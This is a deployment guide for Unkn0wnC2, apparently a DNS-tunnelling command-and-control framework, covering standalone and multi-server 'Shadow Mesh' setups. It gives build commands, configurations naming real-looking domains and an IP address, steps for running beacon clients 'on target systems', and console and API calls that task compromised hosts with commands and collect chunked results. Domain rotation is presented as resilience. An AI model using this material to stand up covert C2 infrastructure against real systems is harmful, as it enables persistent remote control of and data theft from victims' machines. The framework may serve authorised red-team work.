# Deployment Guide - Unkn0wnC2

This guide covers both **Standalone** and **Distributed (Shadow Mesh)** deployment modes.

---

## 🏗️ Deployment Modes

### Standalone Mode (Default)
Traditional single-server C2 deployment:
- **1 DNS Server**: Authoritative DNS with integrated C2
- **Console**: Interactive command-line interface
- **Clients**: Connect to single domain
- **Use Case**: Small operations, testing, single-domain infrastructure

### Distributed Mode (Shadow Mesh)
Multi-server distributed C2 architecture:
- **1 Master Server**: Central command with WebUI (HTTPS API)
- **N DNS Servers**: Multiple authoritative DNS servers (lieutenants)
- **No Console on DNS Servers**: Managed through master
- **Clients**: Rotate through multiple domains for resilience
- **Use Case**: Large operations, high availability, load balancing

---

## 📋 Quick Start

### 1. Choose Your Mode

Edit `build_config.json`:
```json
{
  "deployment": {
    "mode": "standalone"  // or "distributed"
  }
}
```

### 2. Build

```bash
# Auto-detect mode from config
bash build.sh

# Or specify mode explicitly
bash build.sh --mode standalone
bash build.sh --mode distributed
```

---

## 🔧 Standalone Deployment

### Configuration
Use default `build_config.json` with `deployment.mode = "standalone"`

### Build Output
```
build/
├── dns-server-linux          # DNS server with console
├── dns-client-linux          # Linux client
├── dns-client-windows.exe    # Windows client
└── stager/
    └── stager-linux-x64      # Deployment stager
```

### Deployment Steps

1. **DNS Server Setup**:
   ```bash
   # On DNS server (requires root for port 53)
   sudo ./dns-server-linux
   ```

2. **Configure DNS Records**:
   ```
   example.com.     IN  NS  ns1.example.com.
   ns1.example.com. IN  A   <your-server-ip>
   ```

3. **Deploy Clients**:
   ```bash
   # On target systems
   ./dns-client-linux        # Linux
   dns-client-windows.exe    # Windows
   ```

4. **Interact via Console**:
   ```
   [Console] > beacons                    # List active beacons
   [Console] > task <beacon-id> whoami    # Execute command
   [Console] > result <task-id>           # Get result
   ```

---

## 🌐 Distributed Deployment (Shadow Mesh)

### Configuration

1. **Copy Example Config**:
   ```bash
   cp build_config.distributed.example.json build_config.json
   ```

2. **Configure DNS Servers**:
   Edit `deployment.dns_servers` array:
   ```json
   {
     "deployment": {
       "mode": "distributed",
       "dns_servers": [
         {
           "id": "dns-1",
           "domain": "secwolf.net",
           "bind_addr": "172.26.13.62",
           "bind_port": 53,
           "server_address": "98.90.218.70",
           "ns1": "ns1.secwolf.net",
           "ns2": "ns2.secwolf.net"
         },
         {
           "id": "dns-2",
           "domain": "example.com",
           "bind_addr": "10.0.1.50",
           "bind_port": 53,
           ...
         }
       ]
     }
   }
   ```

3. **Configure Master Server**:
   ```json
   {
     "deployment": {
       "master": {
         "enabled": true,
         "bind_addr": "0.0.0.0",
         "bind_port": 8443,
         "jwt_secret": "CHANGE-THIS-64-CHAR-RANDOM-STRING",
         "admin_password": "CHANGE-THIS-STRONG-PASSWORD"
       }
     }
   }
   ```

4. **Configure Clients**:
   Automatically populated from `dns_servers` during build:
   ```json
   {
     "client": {
       "dns_domains": ["secwolf.net", "example.com", "testdomain.org"],
       "domain_selection_mode": "random"
     }
   }
   ```

### Build Output
```
build/
├── master-server-linux           # Master command server
├── master_config.json            # Master configuration (ready to use)
├── certs/
│   ├── master.crt                # Generated TLS certificate
│   └── master.key                # Generated TLS private key
├── configs/
│   ├── master_config.json        # Master config (backup)
│   ├── dns_server_dns-1_config.json  # DNS-1 config
│   └── dns_server_dns-2_config.json  # DNS-2 config
├── dns-server-dns-1              # DNS server for secwolf.net
├── dns-server-dns-2              # DNS server for errantshield.com
├── dns-client-linux              # Multi-domain client
├── dns-client-windows.exe        # Multi-domain client
└── stager/
    └── stager-linux-x64
```

**Note**: The build script automatically:
- Generates unique API keys for each DNS server
- Creates TLS certificates for master server (self-signed, valid 365 days)
- Copies master_config.json to build/ directory for easy deployment
- Embeds correct configuration into each DNS server binary

### Deployment Steps

#### Step 1: Deploy Master Server

```bash
# 1. Copy master server and config to deployment location
scp build/master-server-linux root@master-server:/opt/c2/
scp build/master_config.json root@master-server:/opt/c2/
scp -r build/certs root@master-server:/opt/c2/

# 2. On master server
ssh root@master-server
cd /opt/c2

# 3. Verify configuration (optional - edit if needed)
cat master_config.json

# 4. Start master server
./master-server-linux
```

**Configuration is pre-generated** with:
- JWT secret from `build_config.json`
- Unique API keys for each DNS server
- TLS certificates (self-signed, valid 365 days)
- Admin credentials from `build_config.json`

**⚠️ TLS Note:** DNS servers use `InsecureSkipVerify: true` to accept self-signed certificates. For production with proper CA-signed certificates, modify `Server/master_client.go` to verify certificates properly.

#### Step 2: Deploy DNS Servers

On each DNS server:

```bash
# 1. Copy DNS server binary and config
# Example for dns-1 (secwolf.net):
scp build/dns-server-dns-1 root@dns1-server:/opt/c2/dns-server
scp build/configs/dns_server_dns-1_config.json root@dns1-server:/opt/c2/config.json

# Example for dns-2 (errantshield.com):
scp build/dns-server-dns-2 root@dns2-server:/opt/c2/dns-server
scp build/configs/dns_server_dns-2_config.json root@dns2-server:/opt/c2/config.json

# 2. On each DNS server
ssh root@dns1-server
cd /opt/c2

# 3. Start DNS server (requires root for port 53)
sudo ./dns-server
```

**Configuration is pre-generated** with:
- Correct bind address and domain for each server
- Master server URL and unique API key
- Proper master_server_id for tracking

#### Step 3: Configure DNS Records

For each domain, configure authoritative NS records:

```
# For secwolf.net
secwolf.net.     IN  NS  ns1.secwolf.net.
ns1.secwolf.net. IN  A   <dns-1-ip>

# For example.com
example.com.     IN  NS  ns1.example.com.
ns1.example.com. IN  A   <dns-2-ip>
```

#### Step 4: Deploy Clients

Clients are automatically configured for multi-domain:

```bash
# On target systems
./dns-client-linux        # Will rotate: secwolf.net → example.com → testdomain.org
dns-client-windows.exe
```

**Client Behavior**:
- Random domain selection for each check-in
- Task chunks sent to same DNS server (task affinity)
- Automatic failover if domain unavailable

#### Step 5: Access Master WebUI/API

```bash
# Login to get JWT token
curl -k -X POST https://master.yourinfra.com:8443/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"StrongPassword123!"}'

# List beacons (from all DNS servers)
curl -k https://master.yourinfra.com:8443/api/beacons \
  -H "Authorization: Bearer <jwt-token>"

# Create task
curl -k -X POST https://master.yourinfra.com:8443/api/beacons/<beacon-id>/task \
  -H "Authorization: Bearer <jwt-token>" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami"}'
```

---

## 🔄 How Distributed Mode Works

### Beacon Registration Flow
```
Client (beacon-123)
    ↓ Check-in to secwolf.net
DNS Server 1 (secwolf.net)
    ↓ Reports beacon to master
Master Server
    ↓ Syncs beacon info every 30s
DNS Server 2 (example.com)
    ↓ Now knows about beacon-123
Client (beacon-123)
    ↓ Next check-in to example.com ✓
DNS Server 2 recognizes beacon!
```

### Task Distribution Flow
```
Operator → Master WebUI
    ↓ Creates task for beacon-123
Master Server stores task
    ↓ DNS servers poll every 10s
DNS Server 1,2,3 fetch tasks
    ↓ Client checks in
Client receives task from any server ✓
```

### Result Aggregation Flow
```
Client → DNS Server 1: Chunks 1-30
Client → DNS Server 2: Chunks 31-60
Client → DNS Server 3: Chunks 61-100
    ↓ Each reports chunks
Master Server
    ↓ Receives all chunks
    ↓ Reassembles complete result ✓
Operator views on WebUI
```

---

## 📊 Comparison Matrix

| Feature | Standalone | Distributed |
|---------|-----------|-------------|
| **DNS Servers** | 1 | Multiple (3+) |
| **Console** | ✅ Interactive CLI | ❌ (Master WebUI only) |
| **WebUI** | ❌ | ✅ Master HTTPS API |
| **Multi-User** | ❌ | ✅ Role-based access |
| **Load Balancing** | ❌ | ✅ Random domain selection |
| **Fault Tolerance** | ❌ Single point of failure | ✅ Server redundancy |
| **Beacon Awareness** | Local only | ✅ Cross-server sync |
| **Result Handling** | Single server | ✅ Distributed chunk aggregation |
| **Complexity** | Low | Medium-High |
| **Use Case** | Testing, small ops | Production, large ops |

---

## 🔐 Security Considerations

### Standalone
- Secure console access (SSH tunnel, firewall)
- Rotate encryption key regularly
- Monitor DNS query logs

### Distributed
- **TLS Certificates**: Use valid certs or self-signed with pinning
- **JWT Secrets**: 64+ character random strings
- **API Keys**: Unique per DNS server, rotate periodically
- **Admin Password**: Strong password, consider 2FA in future
- **Network Security**: 
  - Firewall master server (only DNS servers + operators)
  - Isolate master<->DNS communication (VPN/private network)
  - Use HTTPS for all master communication
- **Audit Logging**: Master tracks all operator actions

---

## 🐛 Troubleshooting

### DNS Server Won't Connect to Master
```bash
# Check master server accessibility
curl -k https://master.yourinfra.com:8443/health

# Verify API key matches
grep master_api_key Server/config.json
grep api_key Master/master_config.json

# Check logs
tail -f master.log
```

### Client Not Rotating Domains
```bash
# Verify client config
strings dns-client-linux | grep -A5 "DNSDomains"

# Should show: ["secwolf.net","example.com","testdomain.org"]
```

### Chunks Sent to Multiple Servers But Not Reassembled
```bash
# Check master logs
grep "Reassembled result" master.log

# Query result progress via API
curl -k https://master:8443/api/tasks/<task-id>/result \
  -H "Authorization: Bearer <token>"
```

---

## 📚 Additional Resources

- **Master Server Architecture**: `docs/MASTER_SERVER_ARCHITECTURE.md`
- **Master Server README**: `Master/README.md`
- **API Documentation**: `Master/API.md` (coming soon)
- **Client Multi-Domain**: `Client/README.md`

---

## 🎯 Quick Reference

### Standalone Build
```bash
bash build.sh --mode standalone
# Output: build/dns-server-linux, build/dns-client-*
```

### Distributed Build
```bash
bash build.sh --mode distributed
# Output: build/master-server-linux, build/dns-server-dns-*, build/dns-client-*
```

### Configuration Files
- **Standalone**: `build_config.json` (default)
- **Distributed**: Copy from `build_config.distributed.example.json`

### Ports
- **DNS Server**: 53/UDP (requires root)
- **Master Server**: 8443/TCP (HTTPS, configurable)

### Service Management
```bash
# Systemd service examples in docs/systemd/
sudo systemctl start unkn0wn-master
sudo systemctl start unkn0wn-dns-1
```
